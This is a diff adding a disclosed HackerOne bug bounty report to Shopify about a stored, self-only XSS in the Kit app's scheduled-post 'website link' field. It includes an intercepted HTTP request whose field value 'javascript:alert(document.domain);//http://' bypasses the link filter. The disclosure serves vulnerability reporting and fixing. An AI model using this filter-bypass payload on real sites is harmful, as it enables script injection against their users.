@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/214581
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/skavans
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:28.03.2017 20:57:36
+
+Summary:
+This is a stored XSS within the Kit app (kitcrm.com). It would only be visible in a user's own account, making this a self-XSS with low value, but we still fixed the issue since only http links should have been displayed there.
+Hello!
+
+There is improper filtration of the `website link` field of scheduled post. Attacker can intercept the scheduled post creation/modifying request and change it content the following way:
+
+```http
+POST /pages/175422/manual_posts/31163 HTTP/1.1
+Host: kitcrm.com
+<redacted>
+
+-----------------------------15916813141840537191014403553
+Content-Disposition: form-data; name="manual_post[link]"
+
+javascript:alert(document.domain);//http://
+-----------------------------15916813141840537191014403553
+<redacted>
+```
+
+that leads to filter bypass and JS execution while victim clicks the link:
+
+{F169880}
